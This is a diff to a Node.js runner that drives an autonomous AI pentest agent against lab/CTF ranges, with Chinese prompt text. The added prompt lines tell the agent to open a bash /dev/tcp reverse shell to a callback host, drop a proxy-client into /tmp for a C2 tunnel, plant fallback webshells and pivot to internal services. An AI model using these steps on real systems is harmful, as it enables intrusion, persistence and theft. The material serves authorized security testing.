@@ -1,8 +1,9 @@
 import { spawn } from "node:child_process";
-import { existsSync, mkdirSync, appendFileSync, writeFileSync } from "node:fs";
+import { existsSync, mkdirSync, appendFileSync, readFileSync, writeFileSync } from "node:fs";
 import { resolve, join } from "node:path";
 import os from "node:os";
 import chalk from "chalk";
+import { recommendTargetGuide } from "./target-guides.js";
 
 const PROMPT_FILE = ".pen-agent/prompt.txt";
 const MAX_PROMPT_LEN = 16000;
@@ -29,7 +30,7 @@ const WINDOWS_FALLBACK_PATHS = [
 export class Runner {
   constructor(config) {
     this.config = config;
-    this.runCount = 0;
+    this.runCount = config.resumeStartIteration || 0;
   }
 
   async run(context, hooks = {}) {
@@ -38,7 +39,11 @@ export class Runner {
     const logDir = resolve(this.config.workDir, ".pen-agent");
     if (!existsSync(logDir)) mkdirSync(logDir, { recursive: true });
 
-    const promptPath = resolve(this.config.workDir, PROMPT_FILE);
+    const agentDir = this.config.agentWorkDir || this.config.workDir;
+    const agentLogDir = resolve(agentDir, ".pen-agent");
+    if (!existsSync(agentLogDir)) mkdirSync(agentLogDir, { recursive: true });
+
+    const promptPath = resolve(agentDir, PROMPT_FILE);
     writeFileSync(promptPath, prompt, "utf8");
 
     const statusPath = join(logDir, "status.json");
@@ -66,12 +71,13 @@ export class Runner {
 
   _spawn(promptPath, logPath, statusPath, hooks = {}) {
     return new Promise((resolvePromise) => {
+      const agentDir = this.config.agentWorkDir || this.config.workDir;
       const opencodeCmd = process.platform === "win32"
         ? join(process.env.APPDATA || join(os.homedir(), "AppData", "Roaming"), "npm", "node_modules", "opencode-ai", "bin", "opencode.exe")
         : "opencode";
       const args = ["run", "Execute only this round's scoped pentest plan, then stop and hand off.", "--file", promptPath];
       if (this.config.attachUrl) args.push("--attach", this.config.attachUrl);
-      args.push("--dir", this.config.workDir);
+      args.push("--dir", agentDir);
       if (this.config.opencodeAuto) args.push("--auto");
       if (this.config.opencodeModel) args.push("--model", this.config.opencodeModel);
       if (this.config.opencodeAgent) args.push("--agent", this.config.opencodeAgent);
@@ -81,7 +87,7 @@ export class Runner {
       const env = this._buildRunnerEnv();
 
       const child = spawn(opencodeCmd, args, {
-        cwd: this.config.workDir,
+        cwd: agentDir,
         stdio: ["ignore", "pipe", "pipe"],
         shell: false,
         env,
@@ -125,10 +131,15 @@ export class Runner {
       FORCE_COLOR: "0",
       NO_COLOR: "1",
       PEN_AGENT_ARTIFACT_DIR: this.config.artifactDir,
+      PEN_AGENT_WORK_DIR: this.config.agentWorkDir || this.config.workDir,
+      PEN_AGENT_CALLBACK_HOST: this.config.callbackHost || "",
+      PEN_AGENT_PROXY_PORT: String(this.config.proxyPort),
       PEN_AGENT_SCRIPTS_DIR: join(this.config.artifactDir, "scripts"),
       PEN_AGENT_PAYLOADS_DIR: join(this.config.artifactDir, "payloads"),
       PEN_AGENT_DOWNLOADS_DIR: join(this.config.artifactDir, "downloads"),
       PEN_AGENT_NOTES_DIR: join(this.config.artifactDir, "notes"),
+      PEN_AGENT_PROXY_CLIENT_LINUX: join(this.config.artifactDir, "tools", "proxy-client-linux-amd64"),
+      PEN_AGENT_PROXY_CLIENT_WINDOWS: join(this.config.artifactDir, "tools", "proxy-client-windows-amd64.exe"),
     };
 
     if (process.platform === "win32") {
@@ -146,22 +157,39 @@ export class Runner {
 
   _status(path, data) {
     try {
-      writeFileSync(path, JSON.stringify(data, null, 2), "utf8");
+      let previous = {};
+      try {
+        if (existsSync(path)) previous = JSON.parse(readFileSync(path, "utf8"));
+      } catch {}
+      writeFileSync(path, JSON.stringify({ ...previous, ...data }, null, 2), "utf8");
     } catch {}
   }
 
   _buildPrompt(context) {
-    const missionBrief = this._missionBrief(context);
-    let prompt = missionBrief;
+    const variants = promptVariants(context);
+    let bestPrompt = "";
 
-    if (!context.isFirstRun) {
-      prompt += this._historyBrief(context, missionBrief.length);
+    for (const variant of variants) {
+      const effectiveContext = {
+        ...context,
+        playbookRecommendations: (context.playbookRecommendations || []).slice(0, variant.playbooks),
+        skillRecommendations: (context.skillRecommendations || []).slice(0, variant.skills),
+      };
+      const missionBrief = this._missionBrief(effectiveContext);
+      let prompt = missionBrief;
+
+      if (!effectiveContext.isFirstRun) {
+        prompt += this._historyBrief(effectiveContext, byteLength(missionBrief));
+      }
+
+      if (!bestPrompt || byteLength(prompt) < byteLength(bestPrompt)) bestPrompt = prompt;
+      if (byteLength(prompt) <= MAX_PROMPT_LEN) return prompt;
     }
 
-    if (prompt.length > MAX_PROMPT_LEN) {
-      prompt += `\n\n[warning] Prompt length ${prompt.length} exceeds soft budget ${MAX_PROMPT_LEN}; core mission kept intact. Consider reducing playbook/history verbosity.\n`;
-    }
-    return prompt;
+    return fitText(bestPrompt, MAX_PROMPT_LEN, {
+      keep: "head",
+      marker: "[prompt truncated: hard budget reached after reducing playbooks, skills, and history]",
+    });
   }
 
   _historyBrief(context, missionLength) {
@@ -252,17 +280,43 @@ export class Runner {
     p += "- 如果提前发现 flag 或高危漏洞，可以完成必要取证，但不要因此展开新的大范围任务；把后续动作写入下一轮建议。\n\n";
 
     p += "已获访问后的推进规则（通用，不绑定某个靶场）：\n";
-    p += "- 一旦通过 RCE、webshell、命令执行、SSH、SSRF 回显或类似方式获得入口节点访问，下一阶段必须先做后渗透基础枚举，而不是继续在入口页面重复扫目录或猜参数。\n";
-    p += "- 基础枚举最小集合：id; whoami; hostname; pwd; uname -a; ip addr; ip route; cat /etc/hosts; cat /etc/resolv.conf; env | sort; command -v curl wget nc nmap python3 python bash sh ssh ftp redis-cli smbclient ldapsearch mysql psql。\n";
+    p += "- 一旦通过 RCE、webshell、命令执行、SSH、SSRF 回显或类似方式获得入口节点访问，先稳定当前访问点，但不要为了反连/C2 阻塞基础枚举。\n";
+    p += "- 通用后渗透顺序：\n";
+    p += "  1) 立即确认权限和执行点：id; whoami; hostname; pwd; uname -a。\n";
+    p += "  2) 立刻做最小网络枚举并保存证据：ip addr; ip route; cat /etc/hosts; cat /etc/resolv.conf; env | sort; command -v curl wget nc nmap python3 python bash sh ssh ftp redis-cli smbclient ldapsearch mysql psql。\n";
+    p += "  3) 把接口 CIDR、默认路由、DNS search domain、hosts、LAB_ROUTES/ROUTES 等环境变量写入 notes，作为内网扫描范围依据。\n";
+    p += "  4) 基础枚举完成后再尝试持久化通道；持久化失败不能阻止本轮交付内网路由和服务发现证据。\n";
+    if (this.config.callbackHost) {
+      p += `- 回连地址已配置: ${this.config.callbackHost}；反向 shell/C2 只能连接该地址，不要使用 localhost 作为远端回连目标。\n`;
+      p += "- 持久化通道优先级（每类最多尝试 2 次，失败则记录原因并继续）：\n";
+      p += `  1) bash -i >& /dev/tcp/${this.config.callbackHost}/<监听端口> 0>&1 反向 shell（如果目标有 bash 且 /dev/tcp 可用）。\n`;
+      p += `  2) 下载 proxy-client 到目标 /tmp/ 并启动，连接 ${this.config.callbackHost}:${this.config.proxyPort} 建立 C2 隧道。\n`;
+      p += "  3) 如果以上均失败，写入备用 webshell（不同文件名、不同路径）作为下一轮 fallback。\n";
+    } else {
+      p += "- 当前未配置 PEN_AGENT_CALLBACK_HOST/--callback-host；不要编造反连地址，不要让目标连接 localhost。可先完成基础枚举、服务发现和备用 webshell，汇总中明确需要 callback host 后再尝试 C2。\n";
+    }
+    p += "- 如果入口节点存在 DMZ 出站防火墙（无法出站到公网、ping 不通外部、反向 shell 无响应），不要反复尝试反向 shell；改用 HTTP 轮询 webshell/CGI 执行命令，每一轮 POST 新命令获取输出。\n";
     p += "- 内网扫描范围只能从实际证据推导：接口 CIDR、路由表、hosts、DNS search domain、应用配置、源码、下载文件、页面泄露和已验证服务返回；不要写死某个靶场的 IP 段。\n";
     p += "- 使用已控入口节点作为观测点做小范围服务验证，优先端口：80,443,8080,8000,8009,8983,3000,5000,5984,6379,21,22,139,389,445,3306,5432,9000,9001。\n";
     p += "- 服务发现阶段只确认连通性、banner、状态码、版本、认证状态和最小页面证据；除非本轮计划要求利用，否则不要把所有发现的服务在同一轮全部打穿。\n";
-    p += "- 将发现的服务按指纹映射到 playbook：ThinkPHP、Spring、Struts、Solr、GitLab/Gogs、Redis、Samba/SMB、CouchDB、ProFTPD、MinIO、LDAP、数据库。下一轮优先按服务证据执行对应 playbook。\n";
+    p += "- 日志卫生强制要求：不要把整页 HTML/CSS/JS 输出到主日志。网页响应只输出 HTTP code、Location、Server、title、关键 grep 和前 20 行响应头；需要保留全文时保存到 artifacts/downloads 并在日志中摘要路径和关键发现。\n";
+    p += "- 将发现的服务按指纹映射到 playbook：ThinkPHP、Spring、Apache HTTPD、Struts、Solr、GitLab/Gogs、Redis、Samba/SMB、CouchDB、ProFTPD、MinIO、LDAP、数据库。下一轮优先按服务证据执行对应 playbook。\n";
     p += "- 每个节点最多一个 flag。已确认当前节点 flag 后，停止在该节点继续寻找第二个 flag，转向未覆盖节点或把线索写入下一轮建议。\n\n";
 
+    if (context.skillRecommendations?.length) {
+      p += "Skill 加载要求（必须优先执行，playbook 的前提）：\n";
+      p += "- 本轮推荐的 skill 必须用 skill 工具逐个加载阅读。Skill 提供漏洞原理、协议细节、payload 变体和失败排查方法，是执行对应 playbook 的知识基础。\n";
+      for (const item of context.skillRecommendations) {
+        p += `- 推荐 skill: ${item.name}，原因: ${item.reason}\n`;
+      }
+      p += "- 每个加载的 skill 必须在日志中输出【Skill 使用】，写明 skill 名称、命中原因、采用了哪些检查项、验证结果。\n";
+      p += "- 如果某个推荐 skill 与当前目标证据不匹配，可以跳过并说明原因。\n";
+      p += "- Skill 只提供打法参考，仍必须以当前靶场证据和授权边界为准，不得跳过证据链直接套用结论。\n\n";
+    }
+
     if (context.playbookRecommendations?.length) {
-      p += "漏洞 Playbook（优先执行）：\n";
-      p += "- 本轮应优先按命中的 playbook 推进；playbook 是具体步骤模板，不是越权许可，只有当目标服务、版本、端口或页面证据匹配时才执行。\n";
+      p += "漏洞 Playbook（基于 skill 原理执行的具体步骤）：\n";
+      p += "- 加载对应 skill 后，按 playbook 步骤推进；playbook 是 skill 原理在靶场中的操作模板，不是独立的知识来源。\n";
       p += "- 使用 playbook 时必须输出【Playbook 使用】，写明 playbook id、命中证据、执行到的步骤、成功/失败证据和下一步。\n";
       for (const playbook of context.playbookRecommendations) {
         p += `- ${playbook.id} (${playbook.title})\n`;
@@ -274,15 +328,12 @@ export class Runner {
       p += "- 如果某 playbook 不适合当前证据，必须明确跳过原因，不要强行套用 payload。\n\n";
     }
 
-    if (context.skillRecommendations?.length) {
-      p += "Skill 使用要求（辅助 playbook）：\n";
-      p += "- skill 用于补充 playbook 的细节、变体、失败排查和协议/工具用法；不要因为阅读 skill 而偏离本轮 playbook 和计划边界。\n";
-      for (const item of context.skillRecommendations) {
-        p += `- 推荐 skill: ${item.name}，原因: ${item.reason}\n`;
-      }
-      p += "- 如果使用了 skill，必须在日志中输出【Skill 使用】并写明 skill 名称、命中原因、采用了哪些检查项、验证结果。\n";
-      p += "- 如果没有使用某个推荐 skill，必须说明原因，例如 playbook 已足够、与本轮边界不匹配、缺少前置访问、目标证据不足。\n";
-      p += "- skill 只提供打法参考，仍必须以当前靶场证据和授权边界为准，不得跳过证据链直接套用结论。\n\n";
+    const targetGuide = recommendTargetGuide(this.config, context);
+    if (targetGuide) {
+      p += `靶场打法引导（${targetGuide.id}）：\n`;
+      p += `- ${targetGuide.title}\n`;
+      for (const item of targetGuide.body || []) p += `- ${item}\n`;
+      p += "- 该引导只在当前远程证据匹配时使用；若证据不匹配，以实际响应和授权边界为准。\n\n";
     }
 
     p += "产物目录要求（强制）：\n";
@@ -303,6 +354,17 @@ export class Runner {
     p += "- 可以输出详细的思路摘要、判断依据和计划，但必须基于命令输出、响应内容、状态码、页面差异、文件内容等可观察证据，不要编造不可验证内容。\n";
     p += "- 保留关键证据片段：URL、参数、状态码、响应差异、命令输出摘要、上传路径、会话信息、凭据、回连地址、flag。\n\n";
 
+    p += "有效 flag 证据规则（强制）：\n";
+    p += "- 只有来自授权目标 HTTP 响应、目标 RCE/webshell/SSH/C2 输出、目标服务协议客户端输出的 flag 才算有效。\n";
+    p += "- 总结每个 flag 时必须写明远程证据命令或 HTTP 请求；没有远程证据命令的 flag 视为无效。\n\n";
+
+    p += "结构化拓扑事实（强制）：\n";
+    p += "- 每轮【本轮汇总】后输出一个【拓扑事实】小节，只记录本轮通过远程响应、目标命令输出或协议客户端确认的事实，不要写猜测。\n";
+    p += "- 拓扑事实必须覆盖：主机 hostname/IP/网段、服务 host:port/name/version、路由 from/to/via、已获权限主机、flag 所在主机与获取方法。\n";
+    p += "- 发现 flag 时必须写成：flag=<完整flag> host=<flag所在主机或IP> service=<host:port或-> method=<漏洞/认证/协议方法> command=<远程证据命令或HTTP请求>。\n";
+    p += "- 如果是从 entry01 等跳板执行 curl 访问内网，flag host 是响应中 flag 所在的内网服务主机，不是执行 curl 的跳板主机。\n";
+    p += "- 对只能从路由表/hosts/env 推导出的节点，标记 evidence 为对应输出摘要；不要把本机 Docker、源码或 fixture 内容写入拓扑事实。\n\n";
+
     p += "本轮停止标准：\n";
     p += "- 达成本轮计划列出的目标后必须停止，并输出【本轮汇总】、【证据清单】、【问题与修正】、【下一轮建议】、【奖励评估】、【本轮停止】。\n";
     p += "- 不要在同一轮里同时完成信息收集、扫描、利用、横向、收尾等多个大阶段。\n";
@@ -314,6 +376,7 @@ export class Runner {
     p += "- 如果 445/139 端口可达但缺少 smbclient、mount.cifs、python3+impacket 或稳定 TCP 隧道，应停止重复裸 TCP 尝试，把该目标记录为“TCP 可达但缺少 SMB 协议客户端/隧道”。\n";
     p += "- 发现协议客户端缺失后，优先寻找具备工具的内网跳板节点、开发机或已控主机；如果存在 dev/workstation/bastion/jump host，应评估是否可在该节点上运行协议客户端，或建立 TCP 隧道后在本机使用协议客户端。\n";
     p += "- 如果靶场页面、README、配置文件或数据库中已经给出 jump/dev/MinIO/Samba 等凭据或服务级捷径，要优先把它们作为证据驱动路径验证；不要只尝试通用默认密码。\n";
+    p += "- 以下 local-goad 规则只在已出现 10.80.*、corp.local 或 local-goad 证据时适用；sentinel/10.92 靶场不要套用这些 10.80 示例。\n";
     p += "- 对 local-goad 形态的 Samba，优先目标是读取 //files01/myshare/flag.txt；如果用户授权范围允许访问公开 jump01 SSH 端口，可建立本机到 files01:445 的端口转发后使用本机 smbclient；如果已通过入口或内网凭据进入 dev01，则直接在 dev01 上运行 smbclient。\n";
     p += "- 对 local-goad 形态的 MinIO，公开对象路径通常是 http://minio01:9000/flag/flag.txt 或 http://10.80.30.50:9000/flag/flag.txt；若需要认证，优先验证已发现的 MinIO root 凭据，而不是只猜 minioadmin/minioadmin。\n";
     p += "- 对 files01、db01、ldap01 等协议型节点，汇总时必须写清楚：端口连通性、已检查的客户端工具、失败原因、下一步需要的跳板/隧道/凭据，而不是简单写“失败”。\n\n";
@@ -328,8 +391,12 @@ export class Runner {
     p += "- runner 已为 macOS/Linux/Windows 补齐常见工具 PATH，并在 POSIX 系统上优先使用 bash/sh；命令中不要重新赋值 PATH/path，也不要在循环中使用 path 作为变量名。\n";
     p += "- 循环变量请使用 item、target_path、route、name 等；如果出现 curl/nmap/python 间歇性 command not found，优先检查当前命令是否覆盖了 PATH/path，并用 command -v 复核工具位置。\n";
     p += "- 横向代理服务已启动时可使用，但只在本轮计划允许时使用。\n";
-    p += `- 代理服务端: localhost:${this.config.proxyPort}\n`;
+    p += `- 代理服务端监听本机: 0.0.0.0:${this.config.proxyPort}\n`;
+    p += `- 目标回连地址: ${this.config.callbackHost || "未配置；不要使用 localhost 作为目标回连地址"}\n`;
     p += `- 工具产物环境变量: PEN_AGENT_ARTIFACT_DIR=${this.config.artifactDir}\n`;
+    p += `- 回连环境变量: PEN_AGENT_CALLBACK_HOST=${this.config.callbackHost || ""}\n`;
+    p += `- Linux proxy-client 可用路径: ${join(this.config.artifactDir, "tools", "proxy-client-linux-amd64")}\n`;
+    p += `- Windows proxy-client 可用路径: ${join(this.config.artifactDir, "tools", "proxy-client-windows-amd64.exe")}\n`;
     return p;
   }
 }
@@ -353,20 +420,78 @@ function pickExistingShell(candidates, fallback) {
   return fallback || "/bin/sh";
 }
 
+function promptVariants(context = {}) {
+  const playbookCount = context.playbookRecommendations?.length || 0;
+  const skillCount = context.skillRecommendations?.length || 0;
+  const playbookLimits = uniqueDescending([
+    playbookCount,
+    Math.min(playbookCount, 5),
+    Math.min(playbookCount, 3),
+    Math.min(playbookCount, 1),
+    0,
+  ]);
+  const skillLimits = uniqueDescending([
+    skillCount,
+    Math.min(skillCount, 3),
+    Math.min(skillCount, 1),
+    0,
+  ]);
+
+  const variants = [];
+  for (const playbooks of playbookLimits) {
+    for (const skills of skillLimits) {
+      variants.push({ playbooks, skills });
+    }
+  }
+  return variants;
+}
+
+function uniqueDescending(values) {
+  return [...new Set(values.filter((value) => Number.isInteger(value) && value >= 0))]
+    .sort((a, b) => b - a);
+}
+
 function fitText(value, maxLength, options = {}) {
   const text = String(value || "");
-  if (text.length <= maxLength) return text;
+  if (byteLength(text) <= maxLength) return text;
 
   const marker = options.marker || "[truncated]";
   const markerBlock = `${marker}\n`;
-  const budget = Math.max(0, maxLength - markerBlock.length);
+  const budget = Math.max(0, maxLength - byteLength(markerBlock));
   if (budget <= 0) return marker;
 
   if (options.keep === "tail") {
-    return markerBlock + trimToLineBoundary(text.slice(-budget), "start");
+    return markerBlock + trimToLineBoundary(takeBytes(text, budget, "tail"), "start");
   }
 
-  return trimToLineBoundary(text.slice(0, budget), "end") + `\n${marker}`;
+  return trimToLineBoundary(takeBytes(text, budget, "head"), "end") + `\n${marker}`;
+}
+
+function byteLength(value) {
+  return Buffer.byteLength(String(value || ""), "utf8");
+}
+
+function takeBytes(text, maxBytes, keep) {
+  const chars = Array.from(String(text || ""));
+  let low = 0;
+  let high = chars.length;
+  let best = "";
+
+  while (low <= high) {
+    const mid = Math.floor((low + high) / 2);
+    const candidate = keep === "tail"
+      ? chars.slice(chars.length - mid).join("")
+      : chars.slice(0, mid).join("");
+
+    if (byteLength(candidate) <= maxBytes) {
+      best = candidate;
+      low = mid + 1;
+    } else {
+      high = mid - 1;
+    }
+  }
+
+  return best;
 }
 
 function trimToLineBoundary(text, side) {
